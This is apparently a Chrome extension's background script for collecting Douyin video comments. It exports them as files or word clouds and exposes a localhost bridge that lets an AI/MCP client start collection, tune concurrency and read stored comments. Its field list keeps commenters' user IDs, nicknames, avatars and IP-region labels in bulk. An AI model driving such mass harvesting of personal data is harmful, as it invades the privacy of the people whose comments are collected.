    return { ok: false, error: 'MISSING_VIDEO_ID', hint: '导出词云需要选视频：面板里在「导出范围」选视频后点按钮；AI/MCP 用 cloud 命令传 videoId / videoIds / all:true' };
  }
  const allVideos = await getVideos();
  const docs = [];
  for (const v of pickIds) {
    const list = Object.values(await getComments(v));
    if (!list.length) continue;
    const meta = allVideos[v] || {};
    docs.push({
      __name: `douyin-comments-${v}.json`,
      videoId: v,
      title: meta.title || '',
      url: 'https://www.douyin.com/video/' + v,
      collectedAt: meta.collectedAt || '',
      count: list.length,
      comments: list,
    });
  }
  if (!docs.length) {
    return { ok: false, error: 'EMPTY_POOL', videoIds: pickIds, hint: '选中的视频本地都没有评论数据：先采集，再点「导出词云」' };
  }
  const total = docs.reduce((n, d) => n + d.count, 0);
  const title = docs.length === 1
    ? `词云 · ${docs[0].title || docs[0].videoId}`
    : `词云 · ${docs.length} 个视频`;
  const html = buildCloudHtml(docs, title);
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const tag = docs.length > 1 ? 'selected' + docs.length : docs[0].videoId;
  return {
    ok: true,
    html,
    docs,
    name: `douyin-wordcloud-${tag}-${stamp}.html`,
    title,
    count: total,
    videoCount: docs.length,
    videoIds: docs.map((d) => d.videoId),
    videos: docs.map((d) => ({ videoId: d.videoId, title: d.title, count: d.count })),
  };
}

// AI / MCP 用：落盘成 .html 文件（collector.mjs 靠下载事件拿 htmlPath）
async function exportCloud(opts) {
  const p = await buildCloudPayload(opts);
  if (!p.ok) return p;
  const dl = await download(p.html, p.name, 'text/html;charset=utf-8');
  return Object.assign({
    count: p.count,
    videoCount: p.videoCount,
    videoIds: p.videoIds,
    videos: p.videos,
  }, dl);
}

// v0.5.46：面板用——不下载、也不造 blob:/data: URL（MV3 Service Worker 没有 URL.createObjectURL，
// 且 data: URL 有 2MB 上限、扩展页 CSP 又禁止内联脚本）。
// 做法：把 boot 数据放进 chrome.storage.local，再打开扩展自带的 index.html?cloudview=1，
// 由 app.js 里的「云图页」逻辑（外部脚本，符合 CSP）直接渲染同一套词云界面。
async function openCloud(opts) {
  const p = await buildCloudPayload(opts);
  if (!p.ok) return p;
  const boot = { exportedAt: new Date().toISOString(), title: p.title, docs: p.docs };
  // v0.5.48：专用云图页 cloud.html（不再复用诊断页 index.html，避免先闪一下诊断界面）；
  // 同时记住这批视频 id，供云图页上的「下载 HTML」按同一范围重新落盘。
  await chrome.storage.local.set({ dts_cloud_view: boot, dts_cloud_view_ids: p.videoIds });
  const tab = await chrome.tabs.create({ url: chrome.runtime.getURL('cloud.html') + '?cloudview=1', active: true });
  return {
    ok: true,
    opened: true,
    tabId: tab && tab.id,
    bytes: p.html ? p.html.length : 0,
    count: p.count,
    videoCount: p.videoCount,
    videoIds: p.videoIds,
    videos: p.videos,
  };
}

// ---------- 消息路由 ----------

if (chrome && chrome.runtime && chrome.runtime.onMessage && chrome.runtime.onMessage.addListener) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (!msg || !msg.type) return;

  // 扩展后台可达性探针（内容脚本自测用；采集器会读这个结果判断要不要刷新页面自愈）。
  // 必须无副作用：早先用 dts-status 探活会给 dts_videos 写一条 videoId=undefined 的记录。
  if (msg.type === 'dts-ping') {
    sendResponse({ ok: true, pong: true, at: Date.now() });
    return false;
  }

  // AI Bridge 保活（协议 §7.5）：内容脚本周期 ping，不承载采集逻辑
  if (msg.type === 'dts-ai-keepalive') {
    sendResponse({ ok: true, keepalive: true, at: Date.now() });
    return false;
  }

  (async () => {
    try {
      switch (msg.type) {
        case 'dts-comments': {
          const n = await putComments(msg.videoId, msg.comments || [], {
            title: msg.title,
            total: msg.total,
            hasMore: msg.hasMore,
            signedUrlAt: msg.signedUrlAt
          });
          await setBadge(n);
          sendResponse({ ok: true, count: n });
          break;
        }

        case 'dts-status': {
          // 计数与写元数据放进同一个串行任务：否则读到的 count 可能是并发落库之前的旧值
          const n = await serial(async () => {
            const cnt = Object.keys(await getComments(msg.videoId)).length;
            await updateVideoMetaUnlocked(msg.videoId, { title: msg.title, phase: msg.phase, count: cnt });
            return cnt;
          });
          sendResponse({ ok: true, count: n });
          break;
        }

        case 'dts-stats': {
          const videos = await getVideos();
          const key = msg.videoId;
          let count = 0;
          if (key) count = Object.keys(await getComments(key)).length;
          // v0.2.9：面板要显示「本地已存 N 个视频 / M 条」，换视频后仍看得到旧数据还在。
          // totalAll 用 dts_videos 里维护的 count 元数据累加（每条 dts-comments 回包都会更新它），
          // 免得问一次统计就把几万条评论的所有桶都读一遍。
          const vkeys = Object.keys(videos);
          let totalAll = 0;
          for (const v of vkeys) totalAll += Number(videos[v] && videos[v].count) || 0;
          sendResponse({ ok: true, count, totalAll, videoCount: vkeys.length, videos });
          break;
        }

        case 'dts-export': {
          // 面板「导出」与 AI 桥 dts-ai-export 都走这里；范围/成败口径见 exportComments（与 Hub export 同一份）。
          sendResponse(await exportComments({ all: msg.all === true, videoId: msg.videoId, videoIds: msg.videoIds, format: msg.format }));
          break;
        }

        case 'dts-clear': {
          const videoId = msg.videoId;
          if (videoId) {
            await clearStorage(videoId);
          } else if (msg.all === true) {
            // 全清是高危操作，必须显式 all:true —— 空 videoId 绝不兜底成全清
            // （content.js 未识别到视频时以前会发空串，面板却提示"已清空本视频"）
            await clearStorage(null, true);
            aiLastLive = null;   // 数据全没了，「AI 最近一次活体」也没意义了（与 clear_storage 分支一致）
          } else {
            sendResponse({ ok: false, error: 'NO_VIDEO_ID', hint: '清空需要显式 videoId，或 all:true 全清' });
            break;
          }
          await setBadge(0);
          sendResponse({ ok: true });
          break;
        }

        // v0.5.48：云图页上的「下载 HTML」——用同一批 videoIds 走原来的落盘逻辑
        case 'dts-cloud-save': {
          try {
            const sv = await chrome.storage.local.get('dts_cloud_view_ids');
            const ids = (sv && sv.dts_cloud_view_ids) || [];
            sendResponse(await exportCloud(ids.length ? { videoIds: ids } : { all: true }));
          } catch (e) {
            sendResponse({ ok: false, error: 'SAVE_FAILED', hint: String((e && e.message) || e) });
          }
          break;
        }

        // 导出词云（v0.5.46）：写 storage 后打开扩展页 ?cloudview=1（不落盘、不下载）
        case 'dts-cloud-open': {
          try {
            sendResponse(await openCloud({ videoIds: msg.videoIds }));
          } catch (e) {
            sendResponse({ ok: false, error: 'OPEN_FAILED', hint: String((e && e.message) || e) });
          }
          break;
        }
    case 'dts-cloud': {
          sendResponse(await exportCloud({ videoIds: msg.videoIds, videoId: msg.videoId }));
          break;
        }

        default:
          sendResponse({ ok: false, error: 'unknown type: ' + msg.type });
      }
    } catch (e) {
      sendResponse({ ok: false, error: String((e && e.stack) || e) });
    }
  })();

  return true; // 异步响应
  });
}

if (chrome && chrome.runtime && chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener) {
  chrome.runtime.onInstalled.addListener(() => { setBadge(0).catch(() => {}); });
}

// ========================================================================
// AI Bridge（协议 §7，v0.2.0）
// 扩展不能 listen → 出站轮询本地 Hub（douyin-mcp）；命令再转发 content 或 storage。
// ========================================================================

const KEY_AI = 'dts_ai_bridge';
const AI_BRIDGE_DEFAULT = {
  host: '127.0.0.1',
  port: 18765,
  enabled: true,
  intervalMs: 800
};

// 桥接头：Hub 侧只判「存在」，值不重要 —— 它**不是**密码，而是一个「预检门槛」。
// 自定义头必然触发 CORS 预检，而 Hub 的预检只对 chrome-extension:// 放行，
// 所以浏览器里的网页发不出这个头（详见 douyin-mcp/mcp.js 顶部的「安全边界」）。
// 扩展侧零配置、用户无感知，即插即用不变。
const AI_BRIDGE_HEADERS = { 'X-DTS-Bridge': '1' };

let aiLastLive = null;          // 最近一次 content 状态快照
let aiLastCommandAt = 0;
let aiLastResultAt = 0;
let aiLastExtensionAt = 0;

async function getAiConfig() {
  try {
    const o = await chrome.storage.local.get(KEY_AI);
    return Object.assign({}, AI_BRIDGE_DEFAULT, o[KEY_AI] || {});
  } catch (e) {
    return Object.assign({}, AI_BRIDGE_DEFAULT);
  }
}

async function setAiConfig(patch) {
  const cur = await getAiConfig();
  const next = Object.assign({}, cur, patch || {});
  await chrome.storage.local.set({ [KEY_AI]: next });
  return next;
}

function aiBaseUrl(cfg) {
  return `http://${cfg.host}:${cfg.port}/api/v1`;
}

// ========================================================================
// 运行时设置（协议 §3.9）：AI（MCP / DSH 插件）通过桥命令下发采集参数。
//   dts_settings        ← 外部下发（本文件 set_settings / start_collect 的 settings，
//                          以及 DSH 插件每次调用推的那份）
//   dts_user_settings   ← 面板齿轮里用户当场设的（优先级更高）
//   dts_settings_effective ← content.js 每次「开始采集」把**实际生效值**写回来，供核对
// 优先级：内置常量 < dts_settings < dts_user_settings（逐字段判断，见 content.js
// loadRuntimeSettings）。所以 AI 设的值会被用户在面板里设过的同名项盖掉 —— 这是设计如此。
// ========================================================================
const KEY_RUNTIME_SETTINGS = 'dts_settings';
const KEY_USER_SETTINGS = 'dts_user_settings';
const KEY_EFFECTIVE_SETTINGS = 'dts_settings_effective';

// 与 content.js 的硬上限保持一致（改这里要同步改那边）
const SETTINGS_FIELDS = {
  maxCount: { min: 0, max: 1000000, desc: '目标条数，0=不限' },
  lanes: { min: 1, max: 8, desc: '顶层列表路数（v0.5.13 起生效：错峰多路，默认 3；1=单路）' },
  replyLanes: { min: 1, max: 8, desc: '二级回复并发路数' },
  replyGlobalGapMs: { min: 0, max: 2000, desc: '回复请求跨线程的全局最小间隔 ms（0=用扩展内置 250ms）' },
  replyGapMs: { min: 0, max: 60000, desc: '回复同线程请求间隔 ms' },
  replyWarmupMs: { min: 0, max: 600000, desc: '进补采前的静默 ms' },
  replyThrottleMaxWaitMs: { min: 10000, max: 600000, desc: '整段等限流窗口的墙钟上限 ms' }
};

function clampSettings(input, base) {
  const out = Object.assign({}, base || {});
  const unknown = [];
  if (!input || typeof input !== 'object') return { settings: {}, unknown };
  for (const k of Object.keys(input)) {
    const spec = SETTINGS_FIELDS[k];
    if (!spec) { unknown.push(k); continue; }
    const n = Number(input[k]);
    if (!isFinite(n)) { unknown.push(k); continue; }
    out[k] = Math.max(spec.min, Math.min(Math.round(n), spec.max));
  }
  return { settings: out, unknown };
}

async function readSettingsSnapshot() {
  const o = await chrome.storage.local.get([KEY_RUNTIME_SETTINGS, KEY_USER_SETTINGS, KEY_EFFECTIVE_SETTINGS]);
  return {
    external: o[KEY_RUNTIME_SETTINGS] || null,
    user: o[KEY_USER_SETTINGS] || null,
    effective: o[KEY_EFFECTIVE_SETTINGS] || null,
    precedence: '内置常量 < dts_settings（AI 下发） < dts_user_settings（面板齿轮）',
    limits: SETTINGS_FIELDS
  };
}

async function findDouyinTabs() {
  try {
    return await chrome.tabs.query({
      url: ['*://*.douyin.com/*', '*://*.iesdouyin.com/*']
    });
  } catch (e) {
    return [];
  }
}

function pickDouyinTab(tabs) {
  if (!tabs || !tabs.length) return null;
  const active = tabs.filter((t) => t.active);
  const pool = active.length ? active : tabs;
  pool.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
  return pool[0] || null;
}

async function sendToDouyinTab(msg) {
  const tabs = await findDouyinTabs();
  const tab = pickDouyinTab(tabs);
  if (!tab) {
    return {
      ok: false,
      error: 'NO_DOUYIN_TAB',
      hint: '请先在 Chrome 打开抖音页面（www.douyin.com，已登录），再调用页面类 AI 命令。'
    };
  }
  try {
    const resp = await chrome.tabs.sendMessage(tab.id, msg);
    if (resp && resp.ok && resp.status) aiLastLive = resp.status;
    return Object.assign({ tabId: tab.id, tabUrl: tab.url }, resp || { ok: true });
  } catch (e) {
    return {
      ok: false,
      error: String((e && e.message) || e),
      tabId: tab.id,
      tabUrl: tab.url,
      hint: '抖音页扩展内容脚本未就绪：请在该标签页按 F5 刷新，确认扩展已加载且已登录。'
    };
  }
}

function summarizeComments(list) {
  const arr = (list || []).filter(Boolean);
  const top = arr.filter((c) => !c.is_reply);
  const replies = arr.filter((c) => c.is_reply);
  const diggs = arr.map((c) => Number(c.digg_count) || 0).sort((a, b) => a - b);
  const pick = (p) => {
    if (!diggs.length) return 0;
    const i = Math.min(diggs.length - 1, Math.floor((diggs.length - 1) * p));
    return diggs[i];
  };
  const textLen = arr.map((c) => [...String(c.text || '')].length);
  return {
    count: arr.length,
    topLevelCount: top.length,
    replyCount: replies.length,
    digg: {
      min: diggs[0] || 0,
      p25: pick(0.25),
      p50: pick(0.5),
      p75: pick(0.75),
      p90: pick(0.9),
      max: diggs[diggs.length - 1] || 0
    },
    avgTextLen: textLen.length
      ? Math.round((textLen.reduce((a, b) => a + b, 0) / textLen.length) * 10) / 10
      : 0,
    hotCount: arr.filter((c) => c.is_hot).length,
    foldedCount: arr.filter((c) => c.is_folded).length
  };
}

function pickCommentFields(c, fields) {
  if (!c) return c;
  const base = fields && fields.length
    ? fields
    : ['cid', 'text', 'create_time', 'create_time_str', 'digg_count', 'reply_comment_total',
       'ip_label', 'is_hot', 'is_folded', 'level', 'stick_position', 'is_reply', 'parent_cid',
       'user'];
  const out = {};
  for (const k of base) {
    if (k === 'user') {
      const u = c.user || {};
      out.user = {
        uid: u.uid,
        nickname: u.nickname,
        sec_uid: u.sec_uid,
        unique_id: u.unique_id,
        short_id: u.short_id,
        avatar_thumb: u.avatar_thumb
      };
    } else {
      out[k] = c[k];
    }
  }
  return out;
}

async function executeAiCommand(cmd) {
  const type = cmd.type;
  const args = cmd.args || {};
  aiLastCommandAt = Date.now();

  switch (type) {
    case 'status': {
      const videos = await getVideos();
      let count = 0;
      if (args.videoId) {
        count = Object.keys(await getComments(args.videoId)).length;
      } else {
        for (const v of Object.keys(videos)) {
          count += Object.keys(await getComments(v)).length;
        }
      }
      const tabs = await findDouyinTabs();
      return {
        ok: true,
        result: {
          storage: { videos, count, videoCount: Object.keys(videos).length },
          settings: await readSettingsSnapshot(),
          live: aiLastLive,
          tabs: tabs.map((t) => ({ id: t.id, title: t.title, url: t.url, active: !!t.active })),
          bridge: {
            lastCommandAt: aiLastCommandAt,
            lastResultAt: aiLastResultAt,
            lastExtensionAt: aiLastExtensionAt
          }
        }
      };
    }

    case 'live_status':
      return sendToDouyinTab({ type: 'dts-ai-live-status' });

    case 'start_collect': {
      // 可选：本次开始采集要用的参数（协议 §3.9）。写进 dts_settings 后内容脚本
      // 在 startLoop() 里会重读一次 —— 与 DSH 插件同一条通路，改完立即生效。
      let appliedSettings = null;
      if (args.settings && typeof args.settings === 'object') {
        const cur = (await chrome.storage.local.get(KEY_RUNTIME_SETTINGS))[KEY_RUNTIME_SETTINGS] || {};
        const c = clampSettings(args.settings, cur);
        if (Object.keys(c.settings).length) {
          await chrome.storage.local.set({ [KEY_RUNTIME_SETTINGS]: c.settings });
          appliedSettings = c.settings;
        }
      }
      const r = await sendToDouyinTab({ type: 'dts-ai-start' });
      if (r.ok && r.status && r.status.phase === 'waiting-sign' && !r.status.liveVideoId) {
        r.hint = r.status.hint || '当前页还没识别到视频：请先点开一条具体视频（网格页需点开作品浮层）。';
      }
      if (appliedSettings) {
        r.appliedSettings = appliedSettings;
        r.settingsNote = '参数已写进 dts_settings，本次采集生效；面板齿轮里用户设过的同名项优先级更高。';
      }
      return r;
    }

    case 'pause_collect':
      return sendToDouyinTab({ type: 'dts-ai-pause' });

    case 'clear_page':
      return sendToDouyinTab({ type: 'dts-ai-clear-page' });

    case 'list_videos': {
      const videos = await getVideos();
      return {
        ok: true,
        result: {
          videos,
          count: Object.keys(videos).length
        }
      };
    }

    case 'get_comments': {
      const videoId = args.videoId;
      if (!videoId) return { ok: false, error: 'MISSING_VIDEO_ID', hint: 'get_comments 需要 videoId 参数' };
      const map = await getComments(videoId);
      let list = Object.values(map);
      list.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
      const mode = args.mode === 'page' ? 'page' : 'summary';
      const limit = Math.max(1, Math.min(Number(args.limit) || 200, 2000));
      const offset = Math.max(0, Number(args.offset) || 0);
      const videos = await getVideos();
      const meta = videos[videoId] || { videoId };

      if (mode === 'summary') {
        const sample = list.slice(0, Math.min(limit, 50)).map((c) => pickCommentFields(c, args.fields));
        return {
          ok: true,
          result: {
            mode,
            videoId,
            meta,
            summary: summarizeComments(list),
            sample,
            hasMore: list.length > sample.length,
            fullCount: list.length
          }
        };
      }

      const page = list.slice(offset, offset + limit).map((c) => pickCommentFields(c, args.fields));
      return {
        ok: true,
        result: {
          mode,
          videoId,
          meta,
          offset,
          limit,
          returned: page.length,
          fullCount: list.length,
          summary: summarizeComments(list),
          comments: page
        }
      };
    }

    case 'export': {
      // v0.5.9：与面板「导出」同一份实现（exportComments）。
      // args.all === true 时不传 videoId 也能导：把本地所有视频的评论合成一份，
      // CSV 末尾追加 video_id 列。成功按 Hub 约定把主体放进 result（scope / videoCount /
      // count / replyCount / filename / bytes / path），失败保持顶层 error+hint
      // （MISSING_VIDEO_ID / EMPTY_POOL），MCP 才能原样透给模型。
      const r = await exportComments({ all: args.all === true, videoId: args.videoId, videoIds: args.videoIds, format: args.format });
      if (!r.ok) return r;
      return { ok: true, result: r };
    }

    case 'cloud': {
      // v0.5.38：AI/MCP 也能导词云 HTML（原来只有面板「导出词云」按钮能导）。
      // 与面板同一条实现（exportCloud）：传 videoId / videoIds 指定视频，all:true = 本地全部视频。
      let ids = [];
      if (args.all === true) {
        ids = Object.keys(await getVideos());
      } else if (Array.isArray(args.videoIds) && args.videoIds.length) {
        ids = args.videoIds;
      } else if (args.videoId) {
        ids = [String(args.videoId)];
      }
      if (!ids.length) {
        return {
          ok: false,
          error: 'MISSING_VIDEO_ID',
          hint: 'cloud 需要视频：传 videoId / videoIds:[...]，或用 all:true 导本地全部视频'
        };
      }
      const r = await exportCloud({ videoIds: ids });
      if (!r.ok) return r;
      return { ok: true, result: r };
    }

    case 'clear_storage': {
      // 与面板「全部清空」同一条口径：只有显式 all===true 才全清。
      // 以前是「没有 videoId 就全清」—— 模型传错/漏传一个参数就把所有视频的数据删了。
      const videoId = args.videoId ? String(args.videoId) : '';
      if (!videoId && args.all !== true) {
        return {
          ok: false,
          error: 'MISSING_VIDEO_ID',
          hint: 'clear_storage 需要 videoId；要清空**全部**本地数据请显式传 all:true（不可恢复）'
        };
      }
      await clearStorage(videoId || null, !videoId);
      if (!videoId) aiLastLive = null;
      await setBadge(0);
      return { ok: true, result: { cleared: videoId || 'ALL' } };
    }

    case 'get_settings':
      return { ok: true, result: await readSettingsSnapshot() };

    case 'set_settings': {
      // args.clear = 'external' | 'user' | 'all' → 删掉对应键（恢复内置/插件值）
      if (args.clear) {
        const which = String(args.clear);
        const keys = which === 'all'
          ? [KEY_RUNTIME_SETTINGS, KEY_USER_SETTINGS]
          : which === 'user'
            ? [KEY_USER_SETTINGS]
            : [KEY_RUNTIME_SETTINGS];
        await chrome.storage.local.remove(keys);
        return { ok: true, result: { cleared: which, clearedKeys: keys, settings: await readSettingsSnapshot() } };
      }
      const scope = args.scope === 'panel' ? 'panel' : 'external';
      const key = scope === 'panel' ? KEY_USER_SETTINGS : KEY_RUNTIME_SETTINGS;
      const cur = (await chrome.storage.local.get(key))[key] || {};
      const c = clampSettings(args.settings, cur);
      if (!Object.keys(c.settings).length) {
        return {
          ok: false,
          error: 'NO_SETTINGS',
          hint: '请传 settings：{ maxCount, lanes, replyLanes, replyGapMs, replyWarmupMs, replyThrottleMaxWaitMs }；'
            + '或传 clear:"external"|"user"|"all" 恢复默认。'
        };
      }
      await chrome.storage.local.set({ [key]: c.settings });
      return {
        ok: true,
        result: {
          scope,
          key,
          settings: c.settings,
          unknown: c.unknown.length ? c.unknown : undefined,
          note: '内容脚本每次「开始采集」都会重读，改完立即生效；面板齿轮里用户设过的同名项优先级更高。'
        }
      };
    }

    case 'set_bridge_config': {
      const next = await setAiConfig(args || {});
      // intervalMs / host / port 变更立即重建轮询定时器（否则改配置不生效）
      ensureAiPoller().catch(() => {});
      return { ok: true, result: { config: next } };
    }

    default:
      return { ok: false, error: 'UNKNOWN_COMMAND:' + type, hint: '未知 AI 命令类型' };
  }
}

async function aiPollOnce() {
  const cfg = await getAiConfig();
  if (!cfg.enabled) return;
  const base = aiBaseUrl(cfg);
  let commands = [];
  try {
    // host_permissions 已含 127.0.0.1，扩展 fetch 通常不受 CORS 约束；
    // X-DTS-Bridge 是给 Hub 的「预检门槛」（见 mcp.js 顶部的安全边界说明）。
    const res = await fetch(base + '/pending', {
      method: 'GET',
      headers: AI_BRIDGE_HEADERS,
      cache: 'no-store',
      credentials: 'omit',
      mode: 'cors'
    });
    if (!res.ok) return;
    const data = await res.json();
    commands = (data && data.commands) || [];
    aiLastExtensionAt = Date.now();
  } catch (e) {
    // Hub 未启动 / CORS / 网络：静默，不影响面板采集（协议 §7.8）
    return;
  }

  if (!commands.length) return;

  for (const cmd of commands) {
    let out;
    try {
      out = await executeAiCommand(cmd);
    } catch (e) {
      out = { ok: false, error: String((e && e.stack) || e) };
    }
    const body = {
      id: cmd.id,
      type: cmd.type,
      ok: !!out.ok,
      result: out.result !== undefined ? out.result : (out.ok ? out : undefined),
      error: out.error || undefined,
      hint: out.hint || undefined,
      videoId: out.videoId || undefined,
      status: out.status || undefined,
      filename: out.filename || undefined,
      bytes: out.bytes || undefined,
      path: out.path || undefined,
      tabId: out.tabId,
      at: Date.now()
    };
    // 统一拍平：ok 分支把扩展回包主体放进 result（Hub/MCP 更好消费）
    if (out.ok && out.result === undefined && out.status !== undefined) {
      body.result = { status: out.status, tabId: out.tabId, tabUrl: out.tabUrl };
      // start_collect 带参数时要把「本次实际写进去的设置」透出来（否则这里会被拍平丢掉）
      if (out.appliedSettings) {
        body.result.appliedSettings = out.appliedSettings;
        body.result.settingsNote = out.settingsNote;
      }
    } else if (out.ok && out.result === undefined && out.filename !== undefined) {
      body.result = {
        ok: true,
        videoId: out.videoId,
        format: out.format,
        filename: out.filename,
        bytes: out.bytes,
        path: out.path,
        downloadId: out.downloadId
      };
    } else if (out.ok && out.result === undefined) {
      body.result = out;
    }
    try {
      await fetch(base + '/result', {
        method: 'POST',
        headers: Object.assign({ 'Content-Type': 'application/json' }, AI_BRIDGE_HEADERS),
        body: JSON.stringify(body),
        credentials: 'omit',
        mode: 'cors'
      });
      aiLastResultAt = body.at;
    } catch (e) { /* Hub 刚关：结果丢失可重发，不在扩展侧持久化队列 */ }
  }
}

let aiTimer = null;
let aiTimerInterval = 0;   // 当前定时器实际使用的间隔；set_bridge_config 改了 intervalMs 要重建

async function ensureAiPoller() {
  const cfg = await getAiConfig();
  const want = Math.max(200, Number(cfg.intervalMs) || AI_BRIDGE_DEFAULT.intervalMs);
  if (aiTimer && aiTimerInterval === want) return;
  if (aiTimer) { clearInterval(aiTimer); aiTimer = null; }
  const tick = () => {
    try {
      aiPollOnce().catch(() => {});
    } catch (e) { /* poll 内部已兜 */ }
  };
  // 不用 chrome.alarms：权限缺失或 SW 缓存会导致 onAlarm TypeError / 注册失败。
  // setInterval + content keepalive 足够；Hub 不在时静默失败。
  aiTimerInterval = want;
  aiTimer = setInterval(tick, want);
  tick();
}

ensureAiPoller();

if (chrome && chrome.runtime && chrome.runtime.onStartup && chrome.runtime.onStartup.addListener) {
  chrome.runtime.onStartup.addListener(() => { ensureAiPoller(); });
}
if (chrome && chrome.runtime && chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener) {
  chrome.runtime.onInstalled.addListener(() => { ensureAiPoller(); });
}

